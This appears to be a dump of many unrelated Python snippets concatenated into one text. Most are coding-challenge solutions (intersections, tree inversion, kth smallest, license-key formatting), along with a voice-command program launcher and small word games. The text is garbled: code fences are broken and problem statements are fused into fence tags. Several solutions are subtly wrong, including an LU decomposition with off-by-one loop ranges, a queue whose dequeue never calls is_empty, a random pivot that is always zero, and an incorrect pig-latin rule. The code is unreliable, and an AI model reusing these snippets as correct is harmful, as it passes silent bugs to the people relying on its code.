# Input: nums1 = [4,9,5], nums2 = [9,4,9,8,4]
# Output: [4,9]
# Note:
#
# Each element in the result should appear as many times as it shows in both arrays.
# The result can be in any order.
# Follow up:
#
# What if the given array is already sorted? How would you optimize your algorithm?
# What if nums1's size is small compared to nums2's size? Which algorithm is better?
# What if elements of nums2 are stored on disk, and the memory is limited such that
# you cannot load all elements into the memory at once?


class Solution:
    def intersection(self, nums1, nums2):
        nums1.sort()
        nums2.sort()

        i = j = k = 0
        while i < len(nums1) and j < len(nums2):
            if nums1[i] == nums2[j]:
                nums1[k] = nums1[i]
                i += 1
                j += 1
                k += 1
            elif nums1[i] < nums2[j]:
                i += 1
            else:
                j += 1
        return nums1[:k]


if __name__ == "__main__":
    nums1 = [1, 2, 2, 1]
    nums2 = [2, 2]
    print(Solution().intersection(nums1, nums2))
    nums1 = [4, 9, 5]
    nums2 = [9, 4, 9, 8, 4]
    print(Solution().intersection(nums1, nums2))

def average(array):
    # your code goes here
    return sum(set(array)) / len(set(array))


if __name__ == "__main__":
    n = int(input())
    arr = list(map(int, input().split()))
    result = average(arr)
    print(result)

#
# Binary trees are already defined with this interface:
# class Tree(object):
#   def __init__(self, x):
#     self.value = x
#     self.left = None
#     self.right = None
def csBinaryTreeInvert(root):
    if root is None:
        return
    else:
        temp = root
        csBinaryTreeInvert(root.left)
        csBinaryTreeInvert(root.right)

        temp = root.left
        root.left = root.right
        root.right = temp
        return root

# Invert a binary tree.
#
# Example:
#
# Input:
#
#      4
#    /   \
#   2     7
#  / \   / \
# 1   3 6   9
# Output:
#
#      4
#    /   \
#   7     2
#  / \   / \
# 9   6 3   1


class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


import collections


class Solution:
    def invertTree(self, root):
        def helper(node):
            if not node:
                return node

            left = helper(node.left)
            right = helper(node.right)

            node.left = right
            node.right = left

            return node

        return helper(root)

    def invertTreeIterative(self, root):
        if not root:
            return root

        queue = collections.deque()
        queue.append(root)

        while len(queue):

            node = queue.popleft()

            node.left, node.right = node.right, node.left

            if node.left is not None:
                queue.append(node.left)
            if node.right is not None:
                queue.append(node.right)

        return root

class Solution:
    def isSubsequence(self, s: str, t: str) -> bool:
        if len(s) == 0:
            return True
        if len(t) == 0:
            return False
        sp = 0
        for tc in t:
            if s[sp] == tc:
                sp += 1
                if sp == len(s):
                    return True
        return False

# Given a string s and a string t, check if s is subsequence of t.
#
# You may assume that there is only lower case English letters in both s and t.
# t is potentially a very long (length ~= 500,000) string, and s is a short string (<=100).
#
# A subsequence of a string is a new string which is formed from the original string by
# deleting some (can be none) of the characters without disturbing the relative positions
# of the remaining characters. (ie, "ace" is a subsequence of "abcde" while "aec" is not).
#
# Example 1:
# s = "abc", t = "ahbgdc"
#
# Return true.
#
# Example 2:
# s = "axc", t = "ahbgdc"
#
# Return false.
#
# Follow up:
# If there are lots of incoming S, say S1, S2, ... , Sk where k >= 1B, and you want to
# check one by one to see if T has its subsequence. In this scenario, how would you change your code?


class Solution:
    def isSubsequence(self, s, t):
        pointer1 = 0
        pointer2 = 0

        while pointer1 < len(s) and pointer2 < len(t):
            if s[pointer1] == t[pointer2]:
                pointer1 += 1

            pointer2 += 1

        if pointer1 == len(s):
            return True

        return False

# You are given a map in form of a two-dimensional integer grid where 1
# represents land and 0 represents water.
#
# Grid cells are connected horizontally/vertically (not diagonally).
# The grid is completely surrounded by water, and there is exactly one
# island (i.e., one or more connected land cells).
#
# The island doesn't have "lakes" (water inside that isn't connected to
# the water around the island). One cell is a square with side length 1.
# The grid is rectangular, width and height don't exceed 100. Determine the
# perimeter of the island.

# Input:
# [[0,1,0,0],
#  [1,1,1,0],
#  [0,1,0,0],
#  [1,1,0,0]]
#
# Output: 16


class Solution:
    def islandPerimeter(self, grid):
        if len(grid) == 0:
            return 0

        def findPerimeter(row, col):
            side = 4
            if row - 1 >= 0 and grid[row - 1][col] == 1:
                side -= 1
            if row + 1 < len(grid) and grid[row + 1][col] == 1:
                side -= 1
            if col - 1 >= 0 and grid[row][col - 1] == 1:
                side -= 1
            if col + 1 < len(grid[0]) and grid[row][col + 1] == 1:
                side -= 1

            return side

        perimeter = 0
        for r in range(len(grid)):
            for c in range(len(grid[0])):
                if grid[r][c] == 1:
                    perimeter += findPerimeter(r, c)

        return perimeter

# Given two strings s and t, determine if they are isomorphic.
#
# Two strings are isomorphic if the characters in s can be replaced to get t.
#
# All occurrences of a character must be replaced with another character while
# preserving the order of characters. No two characters may map to the same character
# but a character may map to itself.
#
# Example 1:
#
# Input: s = "egg", t = "add"
# Output: true
# Example 2:
#
# Input: s = "foo", t = "bar"
# Output: false
# Example 3:
#
# Input: s = "paper", t = "title"
# Output: true
# Note:
# You may assume both s and t have the same length


class Solution:
    def __init__(self, s, t):
        self.s = s
        self.t = t

    def is_isomorphic(self):

        dict = {}

        for i in range(len(self.s)):

            char_s = self.s[i]
            char_t = self.t[i]

            if char_s not in dict.keys():
                if char_t in dict.values():
                    return False
                dict[char_s] = char_t
            else:
                if dict[char_s] != char_t:
                    return False
        return True


if __name__ == "__main__":
    s = "egg"
    t = "add"
    print(Solution(s, t).is_isomorphic())
    s = "foo"
    t = "bar"
    print(Solution(s, t).is_isomorphic())
    s = "paper"
    t = "title"
    print(Solution(s, t).is_isomorphic())

__author__ = "Gautam Kumar Jaiswal <gautamjaiswal030@gmail.com>"
__version__ = "v1.0"
```

````py
JARVIS: Control windows programs with your voice```


```py

# import modules
from datetime import (
    datetime,
)  # datetime module supplies classes for manipulating dates and times
import subprocess  # subprocess module allows you to spawn new processes

import speech_recognition as sr  # speech_recognition Library for performing speech recognition with support for Google Speech Recognition, etc..

# pip install pyttsx3                   # need to run only once to install the library

# importing the pyttsx3 library
import pyttsx3

# initialisation
engine = pyttsx3.init()


# obtain audio from the microphone
r = sr.Recognizer()
with sr.Microphone() as source:
    engine.say("Say something")
    engine.runAndWait()
    audio = r.listen(source)

# recognize speech using Google Speech Recognition
Query = r.recognize_google(audio)
print(Query)


# Run Application with Voice Command Function
def get_app(Q):
    if Q == "time":  # Show the time
        print(datetime.now())
    elif Q == "notepad":  # open the notepad
        subprocess.call(["Notepad.exe"])
    elif Q == "calculator":  # open the window calculator
        subprocess.call(["calc.exe"])
    elif Q == "shell":  # open the admin shell
        subprocess.call(["powershell.exe"])
    elif Q == "paint":  # open the MS-paint
        subprocess.call(["mspaint.exe"])
    elif Q == "cmd":  # command prompt
        subprocess.call(["cmd.exe"])
    else:
        engine.say("Sorry Try Again")
        engine.runAndWait()

    return


# Call get_app(Query) Func.
get_app(Query)
````

```py
You're given strings J representing the types of stones that are jewels, and S representing the stones you have.  Each character in S is a type of stone you have.  You want to know how many of the stones you have are also jewels.

The letters in J are guaranteed distinct, and all characters in J and S are letters. Letters are case sensitive, so "a" is considered a different type of stone from "A".

Example 1:

Input: J = "aA", S = "aAAbbbb"
Output: 3
Example 2:

Input: J = "z", S = "ZZ"
Output: 0
Note:

S and J will consist of letters and have length at most 50.
The characters in J are distinct.
```

```py


class Solution:
    def numJewelsInStones(self, J, S):
        """
        :type J: str
        :type S: str
        :rtype: int
        """

        count = 0
        for i in J:
            for j in S:
                if j == i:
                    count += 1
        return count

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the jimOrders function below.
def jimOrders(orders):
    res = []
    for i in range(len(orders)):
        orders[i].append(i + 1)
    orders = sorted(orders, key=lambda x: x[0] + x[1])
    for i in range(len(orders)):
        res.append(orders[i][2])
    return res


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    n = int(input())

    orders = []

    for _ in range(n):
        orders.append(list(map(int, input().rstrip().split())))

    result = jimOrders(orders)

    fptr.write(" ".join(map(str, result)))
    fptr.write("\n")

    fptr.close()

def jumpingOnClouds(c):
    i = counter = 0
    length = len(c)

    while i < length - 1:
        if c[i + 2] == 0:
            i += 2
        else:
            i += 1
        counter += 1
    return counter


arr = [0, 0, 0, 0, 1, 0]

print(jumpingOnClouds(arr))

# We have a list of points on the plane.  Find the K closest points to the origin (0, 0).
#
# (Here, the distance between two points on a plane is the Euclidean distance.)
#
# You may return the answer in any order.  The answer is guaranteed to be unique
# (except for the order that it is in.)
#
# Example 1:
# Input: points = [[1,3],[-2,2]], K = 1
# Output: [[-2,2]]
# Explanation:
# The distance between (1, 3) and the origin is sqrt(10).
# The distance between (-2, 2) and the origin is sqrt(8).
# Since sqrt(8) < sqrt(10), (-2, 2) is closer to the origin.
# We only want the closest K = 1 points from the origin, so the answer is just [[-2,2]].
#
# Example 2:
#
# Input: points = [[3,3],[5,-1],[-2,4]], K = 2
# Output: [[3,3],[-2,4]]
# (The answer [[-2,4],[3,3]] would also be accepted.)

import heapq


class Solution:
    def kclosest(self, points, k):
        heap = []

        for point in points:
            d = (point[0] * point[0]) + (point[1] * point[1])
            heapq.heappush(heap, (d, point))
        res = []
        for i in range(k):
            res.append(heapq.heappop(heap)[1])

        return res


if __name__ == "__main__":
    points = [[1, 3], [-2, 2]]
    k = 1
    print(Solution().kclosest(points, k))

def kidsWithCandies(candies, extraCandies):
    temp_array = []
    max_element = max(candies)
    for i in candies:
        temp = i + extraCandies
        if max_element <= temp:
            temp_array.append(True)
        else:
            temp_array.append(False)

    return temp_array


candies = [2, 3, 5, 1, 3]
extraCandies = 3

print(kidsWithCandies(candies, extraCandies))

def kidsWithCandies(candies, extraCandies):
    temp_array = []
    max_element = max(candies)
    for i in candies:
        temp = i + extraCandies
        if max_element <= temp:
            temp_array.append(True)
        else:
            temp_array.append(False)

    return temp_array


candies = [2, 3, 5, 1, 3]
extraCandies = 3

print(kidsWithCandies(candies, extraCandies))

import itertools as t


def chessKnight(cell):
    knight_dir = list(t.permutations([1, 2, -1, -2], 2))
    knight_dir1 = []
    valid_moves = 0
    for i in range(len(knight_dir)):
        if sum(knight_dir[i]) != 0:
            knight_dir1.append(knight_dir[i])
    for x, y in knight_dir1:
        if (97 <= ord(cell[0]) + x <= 104) and (1 <= int(cell[1]) + y <= 8):
            valid_moves += 1
    return valid_moves

# Input:
# N = 6
# arr[] = 7 10 4 3 20 15
# K = 3
# Output : 7
# Explanation :
# 3rd smallest element in the given
# array is 7.

# def kthSmallest(arr, l, r, k):
#     '''
#     arr : given array
#     l : starting index of the array i.e 0
#     r : ending index of the array i.e size-1
#     k : find kth smallest element and return using this function
#     '''
#     arr.sort()
#     return(arr[k-1])

# r=int(input())
# arr=input()
# array=list(map(int,arr.strip().split()))
# k=int(input())
# print(kthSmallest(array,0,r-1,k))


def kthSmallest(arr, l, r, k):

    if k > 0 and k <= r - l + 1:

        pos = randomPartition(arr, l, r)
        if pos - l == k - 1:
            return arr[pos]
        if pos - l > k - 1:

            return kthSmallest(arr, l, pos - 1, k)

        return kthSmallest(arr, pos + 1, r, k - pos + l - 1)

    return 999999999999


def swap(arr, a, b):
    temp = arr[a]
    arr[a] = arr[b]
    arr[b] = temp


def partition(arr, l, r):
    x = arr[r]
    i = l
    for j in range(l, r):
        if arr[j] <= x:
            swap(arr, i, j)
            i += 1
    swap(arr, i, r)
    return i


def randomPartition(arr, l, r):
    n = r - l + 1
    pivot = int(random.random() % n)
    swap(arr, l + pivot, r)
    return partition(arr, l, r)

# Find the kth largest element in an unsorted array. Note that it is the
# kth largest element in the sorted order, not the kth distinct element.
#
# Example 1:
#
# Input: [3,2,1,5,6,4] and k = 2
# Output: 5
# Example 2:
#
# Input: [3,2,3,1,2,4,5,5,6] and k = 4
# Output: 4


class Solution:
    def quickSelect(self, nums, k):
        k = len(nums) - k
        return self.helper(nums, 0, len(nums) - 1, k)

    def helper(self, nums, left, right, k):

        while True:
            pivot = left
            leftIdx = left + 1
            rightIdx = right
            while leftIdx <= rightIdx:
                if nums[leftIdx] > nums[pivot] and nums[rightIdx] < nums[pivot]:
                    nums[leftIdx], nums[rightIdx] = nums[rightIdx], nums[leftIdx]

                if nums[leftIdx] <= nums[pivot]:
                    leftIdx += 1
                if nums[rightIdx] >= nums[pivot]:
                    rightIdx -= 1
            nums[pivot], nums[rightIdx] = nums[rightIdx], nums[pivot]

            if rightIdx == k:
                return nums[rightIdx]
            elif k > rightIdx:
                left = rightIdx + 1
            else:
                right = rightIdx - 1


if __name__ == "__main__":
    nums = [3, 2, 3, 1, 2, 4, 5, 5, 6]
    k = 4
    print(Solution().quickSelect(nums, k))

# Input:
# N = 6
# arr[] = 7 10 4 3 20 15
# K = 3
# Output : 7
# Explanation :
# 3rd smallest element in the given
# array is 7.

# def kthSmallest(arr, l, r, k):
#     '''
#     arr : given array
#     l : starting index of the array i.e 0
#     r : ending index of the array i.e size-1
#     k : find kth smallest element and return using this function
#     '''
#     arr.sort()
#     return(arr[k-1])

# r=int(input())
# arr=input()
# array=list(map(int,arr.strip().split()))
# k=int(input())
# print(kthSmallest(array,0,r-1,k))


def kthSmallest(arr, l, r, k):

    if k > 0 and k <= r - l + 1:

        pos = randomPartition(arr, l, r)
        if pos - l == k - 1:
            return arr[pos]
        if pos - l > k - 1:

            return kthSmallest(arr, l, pos - 1, k)

        return kthSmallest(arr, pos + 1, r, k - pos + l - 1)

    return 999999999999


def swap(arr, a, b):
    temp = arr[a]
    arr[a] = arr[b]
    arr[b] = temp


def partition(arr, l, r):
    x = arr[r]
    i = l
    for j in range(l, r):
        if arr[j] <= x:
            swap(arr, i, j)
            i += 1
    swap(arr, i, r)
    return i


def randomPartition(arr, l, r):
    n = r - l + 1
    pivot = int(random.random() % n)
    swap(arr, l + pivot, r)
    return partition(arr, l, r)

# Let's make a queue using a linked list we need to add an is_empty() method. lets refactor the code


class LinkedListNode:
    def __init__(self, data):
        self.data = data
        self.next = None


class Queue:
    def __init__(self):
        self.front = None
        self.rear = None

    def enqueue(self, item):
        new_node = LinkedListNode(item)
        # check if queue is empty
        if self.rear is None:
            self.front = new_node
            self.rear = new_node
        else:
            # add new node to rear
            self.rear.next = new_node
            # reassign rear to new node
            self.rear = new_node

    def dequeue(self):
        # check if queue is empty
        if not self.is_empty:
            # keep copy of old front
            old_front = self.front
            # set new front
            self.front = old_front.next

        # check if the queue is now empty
        if self.is_empty():
            # make sure rear is also None
            self.rear = None

        return old_front

    def is_empty(self):
        return self.front == None


# test

q = Queue()
print(q.is_empty())  # => True
q.enqueue(12)
print(q.is_empty())  # => False
q.dequeue()
print(q.is_empty())  # => True

# let's implement a stack using a linked list (Let's add some peek functionality)!!!


class LinkedListNode:
    def __init__(self, data):
        self.data = data
        self.next = None


class Stack:
    def __init__(self):
        self.top = None

    def push(self, data):
        # create new node with data
        new_node = LinkedListNode(data)
        # set current top to new node's next
        new_node.next = self.top
        # reset the top pointer to the new node
        self.top = new_node

    def pop(self):
        # make sure stack is not empty
        if self.top is not None:
            # store popped node
            popped_node = self.top
            # reset top pointer to next node
            self.top = popped_node.next
            # return the value from the popped node
            return popped_node.data

    def peek(self):
        if self.top is not None:
            return self.top.data

import math
import numpy


def LUDecompose(table):  # table that contains our data
    # table has to be a square array so we need to check first
    rows, columns = numpy.shape(table)
    L = numpy.zeros((rows, columns))
    U = numpy.zeros((rows, columns))
    if rows != columns:
        return
    for i in range(columns):
        for j in range(i - 1):
            sum = 0
            for k in range(j - 1):
                sum += L[i][k] * U[k][j]
            L[i][j] = (table[i][j] - sum) / U[j][j]
        L[i][i] = 1
        for j in range(i - 1, columns):
            sum1 = 0
            for k in range(i - 1):
                sum1 += L[i][k] * U[k][j]
            U[i][j] = table[i][j] - sum1
    return L, U


matrix = numpy.array([[2, -2, 1], [0, 1, 2], [5, 3, 1]])
L, U = LUDecompose(matrix)
print(L)
print(U)

from sys import stdin, stdout


def laddus(n, origin, activities):
    score = 0
    for i in range(n):
        if "TOP_CONTRIBUTOR" in activities[i]:
            score += 300
        elif "CONTEST_HOSTED" in activities[i]:
            score += 50
        elif "CONTEST_WON" in activities[i]:
            rank = int(activities[i].split()[1])
            if rank > 20:
                score += 300
            else:
                score += 300 + 20 - rank
        else:
            bugscore = int(activities[i].split()[1])
            score += bugscore
    if origin == "INDIAN":
        return score // 200
    else:
        return score // 400


for _ in range(int(stdin.readline())):
    n, origin = stdin.readline().split()
    n = int(n)
    activities = []
    for _ in range(n):
        activities.append(stdin.readline())
    stdout.write(str(laddus(n, origin, activities)) + "\n")

from collections import Counter

T = int(input())
while T:
    s = input()
    n = len(s)
    if n % 2 == 0:
        print("YES") if Counter(s[0 : n // 2]) == Counter(s[(n // 2) : n]) else print(
            "NO"
        )
    else:
        print("YES") if Counter(s[0 : n // 2]) == Counter(
            s[(n // 2) + 1 : n]
        ) else print("NO")
    T -= 1

class Solution:
    # @param A : tuple of integers
    # @return a strings
    def largestNumber(self, A):
        A = [str(item) for item in A]
        A = sorted(A, key=lambda s: s * 9)[::-1]
        return str(int("".join(A)))

#!/bin/python3

import math
import os
import random
import re
import sys
from collections import OrderedDict

# Complete the largestPermutation function below.
def largestPermutation(k, arr):
    N = len(arr)
    dic = {arr[x]: x for x in range(N)}
    swaps = 0
    for x in range(N, 0, -1):
        if dic[x] == N - x:
            continue
        else:
            dic[arr[N - x]] = dic[x]
            arr[dic[x]] = arr[N - x]
            dic[x] = N - x
            arr[N - x] = x
            swaps += 1
        if swaps == k:
            break
    return arr


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    nk = input().split()

    n = int(nk[0])

    k = int(nk[1])

    arr = list(map(int, input().rstrip().split()))

    result = largestPermutation(k, arr)

    fptr.write(" ".join(map(str, result)))
    fptr.write("\n")

    fptr.close()

class Solution:
    def lastStoneWeight(self, stones: List[int]) -> int:
        while len(stones) != 1 and len(stones) != 0:
            stones = sorted(stones)
            t = abs(stones[-1] - stones[-2])
            if t != 0:
                stones.pop()
                stones[-1] = t
            else:
                stones.pop()
                stones.pop()
        if stones:
            return stones[0]
        return 0

# Pig Latin Word Altering Game
# function to convert word in pig latin form
def alterWords():
    wordToAlter = str(input("Word To Translate : "))
    alteredWord = (
        wordToAlter[1:] + wordToAlter[0:2] + "y"
    )  # translating word to pig latin
    if len(wordToAlter) < 46:
        print(alteredWord)
    else:
        print("Too Big . Biggest Word in English Contains 45 characters.")


# main interaction code
while True:
    startOrEnd = str(input("Start or End : "))
    if startOrEnd == "Start":
        print(" ")
        print(alterWords())
        continue
    else:
        quit()

import math
import os
import random
import re
import sys

if __name__ == "__main__":
    nd = input().split()

    n = int(nd[0])

    d = int(nd[1])

    a = list(map(int, input().rstrip().split()))

    a = a[(d % n) : n] + a[0 : (d % n)]

    for i in range(len(a)):
        print(a[i], end=" ")

class Solution:
    def lemonadeChange(self, bills: List[int]) -> bool:
        denom = {5: 0, 10: 0, 20: 0}
        for i in range(len(bills)):
            denom[bills[i]] += 1
            if bills[i] > 5:
                bal = bills[i] - 5
                if bal % 5 == 0 and bal % 10 != 0:
                    if denom[5] > 0:
                        denom[5] -= 1
                        bal -= 5
                        if bal == 0:
                            continue
                if bal % 10 == 0 and bal % 20 != 0:
                    if denom[10] > 0:
                        denom[10] -= 1
                        bal -= 10
                        if bal == 0:
                            continue
                if denom[5] > 1:
                    denom[5] -= 2
                    bal -= 10
                    if bal == 0:
                        continue
                if bal > 0:
                    return False
        return True

# my code may not work with python 3.5 cause it is made for 2.7 version
libs = ["Dragon Freak", "Excuses"]

# precode
def dragonFreak():
    colorDrag = raw_input("Color : ")
    superLatDrag = raw_input("Superlative (ending in est) : ")
    adj1Drag = raw_input("Adjective : ")
    bodyDragPlu = raw_input("Body Part Plural : ")
    bodyDrag = raw_input("Body Part : ")
    nounDrag = raw_input("Noun : ")
    animalDrag = raw_input("Animal(Plural) : ")
    adj2Drag = raw_input("Adjective : ")
    adj3Drag = raw_input("Adjective : ")
    adj4Drag = raw_input("Adjective : ")
    # creating madlib
    fMadLib = """
    The %s Dragon is the %s Dragon of all. It has %s %s,
    and a %s shaped like a %s. It loves to eat %s,
    although it will feast on nearly anything. It is %s and %s.
    You must be %s around it, or you may end up as it`s meal!
    """ % (
        colorDrag,
        superLatDrag,
        adj1Drag,
        bodyDragPlu,
        bodyDrag,
        nounDrag,
        animalDrag,
        adj2Drag,
        adj3Drag,
        adj4Drag,
    )

    print(fMadLib)


def excuses():
    place = raw_input("Place : ")
    adjExcuse = raw_input("Adjective : ")
    bodyPart = raw_input("Bodypart : ")

    fMadLib = """
    I cannot come to %s ,
    because there is %s %s flu
    """ % (
        place,
        adjExcuse,
        bodyPart,
    )
    print(fMadLib)


# main code for user interaction
while True:
    startOrEnd = raw_input("Start or End : ")
    if startOrEnd.strip() == "Start":
        print(libs)
        whichLib = raw_input("Which one :")
        if whichLib.strip() == "Dragon Freak":
            print(dragonFreak())
            continue
        elif whichLib.strip() == "Excuse":
            print(excuses())
            continue
        else:
            print("Not avaliable")
            continue
    elif startOrEnd.strip() == "End":
        print("Progarm Ended...")
        break

# You are given a license key represented as a string S which consists only
# alphanumeric character and dashes.
# The string is separated into N+1 groups by N dashes.
# Given a number K, we would want to reformat the strings such that each group
# contains exactly K characters, except for the first group which could be shorter
# than K, but still must contain at least one character.
# Furthermore, there must be a dash inserted between two groups and all lowercase
# letters should be converted to uppercase.  Given a non-empty string S and a number K,
# format the string according to the rules described above.
# Example 1:
# Input: S = "5F3Z-2e-9-w", K = 4
# Output: "5F3Z-2E9W"
# Explanation: The string S has been split into two parts, each part has 4 characters.
# Note that the two extra dashes are not needed and can be removed.
# Example 2:  Input: S = "2-5g-3-J", K = 2
# Output: "2-5G-3J"
# Explanation: The string S has been split into three parts, each part has 2 characters except
# the first part as it could be shorter as mentioned above.
# Note:  The length of string S will not exceed 12,000, and K is a positive integer.
# String S consists only of alphanumerical characters (a-z and/or A-Z and/or 0-9) and dashes(-).
# String S is non-empty


class Solution:
    def licence_key_formatting(self, S, K):
        strs = S.replace("-", "")
        first = len(strs) % K
        first_part = S[:first]
        licence_key = ""
        for i in range(first, len(strs), K):
            licence_key = licence_key + strs[i : i + K] + "-"
        if len(first_part) > 0:
            licence_key = first_part + "-" + licence_key[:-1]

        else:
            licence_key = licence_key[:-1]
        return licence_key.upper()


if __name__ == "__main__":
    S = "2-5g-3-J"
    K = 2
    print(Solution().licence_key_formatting(S, K))
    S = "5F3Z-2e-9-w"
    K = 4
    print(Solution().licence_key_formatting(S, K))

def knapsackLight(value1, weight1, value2, weight2, maxW):
    if weight1 > maxW and weight2 > maxW and weight1 + weight2 > maxW:
        return 0
    if weight1 + weight2 <= maxW:
        return value1 + value2
    if value1 < value2:
        if weight2 > maxW:
            return value1
        else:
            return value2
    if value2 < value1:
        if weight1 > maxW:
            return value2
        else:
            return value1
    if value1 == value2:
        if weight1 > maxW:
            return value2
        else:
            return value1

from __future__ import print_function

__author__ = "Tobias Carryer"

from time import time


class LinearCongruentialGenerator(object):
    """
    A pseudorandom number generator.
    """

    def __init__(self, multiplier, increment, modulo, seed=int(time())):
        """
        These parameters are saved and used when nextNumber() is called.

        modulo is the largest number that can be generated (exclusive). The most
        efficent values are powers of 2. 2^32 is a common value.
        """
        self.multiplier = multiplier
        self.increment = increment
        self.modulo = modulo
        self.seed = seed

    def next_number(self):
        """
        The smallest number that can be generated is zero.
        The largest number that can be generated is modulo-1. modulo is set in the constructor.
        """
        self.seed = (self.multiplier * self.seed + self.increment) % self.modulo
        return self.seed


if __name__ == "__main__":
    # Show the LCG in action.
    lcg = LinearCongruentialGenerator(1664525, 1013904223, 2 << 31)
    while True:
        print(lcg.next_number())

if __name__ == "__main__":
    x = int(input())
    y = int(input())
    z = int(input())
    n = int(input())
    print(
        [
            [i, j, k]
            for i in range(x + 1)
            for j in range(y + 1)
            for k in range(z + 1)
            if ((i + j + k) != n)
        ]
    )

my_list = ["p", "y", "t", "h", "o", "n"]
# Output: p
print(my_list[0])

# Output: t
print(my_list[2])

# Output: o
print(my_list[4])

# Error! Only integer can be used for indexing
# my_list[4.0]

# Nested List
n_list = ["Happy", [2, 0, 1, 5]]

# Nested indexing

# Output: a
print(n_list[0][1])

# Output: 5
print(n_list[1][3])

list1 = ["apple", "banana", "cherry"]
list2 = [1, 5, 7, 9, 3]
list3 = [True, False, False]

print(list1)
print(list2)
print(list3)

# Design a logger system that receive stream of messages along with its timestamps,
# each message should be printed if and only if it is not printed in the last 10 seconds.
#
# Given a message and a timestamp (in seconds granularity), return true if the
# message should be printed in the given timestamp, otherwise returns false.
#
# It is possible that several messages arrive roughly at the same time.


class Logger:
    def __init__(self):
        self.dict = {}

    def shouldPrintMessage(self, timestamp, message):

        if message not in self.dict:
            self.dict[message] = timestamp
            return True
        if timestamp - self.dict[message] >= 10:
            self.dict[message] = timestamp
            return True
        else:
            return False


if __name__ == "__main__":
    log = Logger()
    print(log.shouldPrintMessage(1, "foo"))
    print(log.shouldPrintMessage(2, "bar"))
    print(log.shouldPrintMessage(3, "foo"))
    print(log.shouldPrintMessage(8, "bar"))
    print(log.shouldPrintMessage(10, "foo"))
    print(log.shouldPrintMessage(11, "foo"))
    # expected [true,true,false,false,false,true]

# Longest Common Prefix
# Write a function to find the longest common prefix string amongst an array of strings.
#
# If there is no common prefix, return an empty string "".
#
# Example 1:
#
# Input: ["flower","flow","flight"]
# Output: "fl"
# Example 2:
#
# Input: ["dog","racecar","car"]
# Output: ""
# Explanation: There is no common prefix among the input strings.
# Note:
#
# All given inputs are in lowercase letters a-z.


def longestCommonPrefix(strs):
    if len(strs) == 0:
        return ""
    elif len(strs) == 1:
        return strs[0]

    commmon_prefix = strs[0]

    for i in range(1, len(strs)):
        if commmon_prefix == "" or strs[i] == "":
            return ""

        for j in range(len(strs[i])):

            if j > len(commmon_prefix) - 1:
                commmon_prefix = commmon_prefix[:j]

                break

            elif commmon_prefix[j] != strs[i][j]:
                commmon_prefix = commmon_prefix[:j]

                break

        commmon_prefix = commmon_prefix[: j + 1]

    return commmon_prefix


if __name__ == "__main__":
    example1 = ["aa", "a"]
    example2 = ["aa", ""]
    example3 = ["flower", "flow", "flight"]
    example4 = ["dog", "racecar", "car"]
    example5 = []

    print(
        "longest common prefix  for "
        + str(example1)
        + " is : "
        + longestCommonPrefix(example1)
    )
    print(
        "longest common prefix  for "
        + str(example2)
        + " is : "
        + longestCommonPrefix(example2)
    )
    print(
        "longest common prefix  for "
        + str(example3)
        + " is : "
        + longestCommonPrefix(example3)
    )
    print(
        "longest common prefix  for "
        + str(example4)
        + " is : "
        + longestCommonPrefix(example4)
    )
    print(
        "longest common prefix  for "
        + str(example5)
        + " is : "
        + longestCommonPrefix(example5)
    )

class Solution:
    def longestCommonPrefix(self, strs: List[str]) -> str:
        x = 0
        for i in zip(*strs):
            r = all(a == i[0] for a in i)
            if r:
                x += 1
            else:
                break
        return strs[0][0:x] if x else ""
```

```pyGiven an array of strings, return another array containing all of its longest strings.

Example:
For inputArray = ["aba", "aa", "ad", "vcd", "aba"], the output should be allLongestStrings(inputArray) = ["aba", "vcd", "aba"]."""


def allLongestStrings(inputArray):
    # Step 1: We begin by defining an empty array called "max_arr", where we will store the longest strings from the given array.
    max_arr = []
    # Step 2: The next step is to define the maximum string length inside our given array.
    # BE CAREFUL: Variable max_len should be defined as follows. If we break it into its components, we can see that:
    # max(inputArray, key = len) locates ONLY ONE of the strings that satisfies the maximum value in terms of the key parameter
    # provided (which, in this case, is the string's length) and the outside len() function defines the value of this maximum length.
    # You are free to test it on a random input array containing various random strings, using a Python compiler online.
    max_len = len(max(inputArray, key=len))
    # Step 3: Now, we go over all strings inside the input array checking if their individual length is equal to the
    # maximum length value defined in step 2. If it is, then we append the respective string to the "max_arr" defined above.
    for i in inputArray:
        if len(i) == max_len:
            max_arr.append(i)
    # Step 4: We conclude by returning the max_arr.
    return max_arr

# Suppose we abstract our file system by a string in the following manner:
#
# The string "dir\n\tsubdir1\n\tsubdir2\n\t\tfile.ext" represents:
#
# dir
#     subdir1
#     subdir2
#         file.ext
# The directory dir contains an empty sub-directory subdir1 and a sub-directory subdir2 containing a file file.ext.
#
# The string "dir\n\tsubdir1\n\t\tfile1.ext\n\t\tsubsubdir1\n\tsubdir2\n\t\tsubsubdir2\n\t\t\tfile2.ext" represents:
#
# dir
#     subdir1
#         file1.ext
#         subsubdir1
#     subdir2
#         subsubdir2
#             file2.ext
#
# The directory dir contains two sub-directories subdir1 and subdir2. subdir1 contains a file file1.ext
# and an empty second-level sub-directory subsubdir1. subdir2 contains a second-level sub-directory
# subsubdir2 containing a file file2.ext.
#
# We are interested in finding the longest (number of characters) absolute path to a file within
# our file system. For example, in the second example above, the longest absolute path is
# "dir/subdir2/subsubdir2/file2.ext", and its length is 32 (not including the double quotes).
#
# Given a string representing the file system in the above format, return the length of the longest
# absolute path to file in the abstracted file system. If there is no file in the system, return 0.


class Solution:
    def lengthLongestPath(self, input):
        paths = input.split("\n")

        maxLength = 0
        dict = {-1: 0}
        for line in paths:

            depth = line.count("\t")
            dict[depth] = len(line) - depth + dict[depth - 1]

            if "." in line:
                maxLength = max(maxLength, dict[depth] + depth)
        return maxLength

# Given a string which consists of lowercase or uppercase letters, find the
# length of the longest palindromes that can be built with those letters.
#
# This is case sensitive, for example "Aa" is not considered a palindrome here.
#
# Note:
# Assume the length of given string will not exceed 1,010.
#
# Example:
#
# Input:
# "abccccdd"
#
# Output:
# 7
#
# Explanation:
# One longest palindrome that can be built is "dccaccd", whose length is 7.

import collections


class Solution:
    def longestPalindrome(self, s):
        dict = collections.Counter(s)
        ans = 0
        for value in dict.values():
            ans += value // 2 * 2
            if ans % 2 == 0 and value % 2 == 1:
                ans += 1
        return ans

# Longest Sequence with two unique numbers


class Solution:
    def findSequence(self, arr):
        last_num = -1
        second_last_num = -1
        last_num_count = 0
        current_max = 0
        maximum = 0

        for num in arr:
            if num == last_num or num == second_last_num:
                current_max += 1
            else:
                current_max = last_num_count + 1

            if num == last_num:
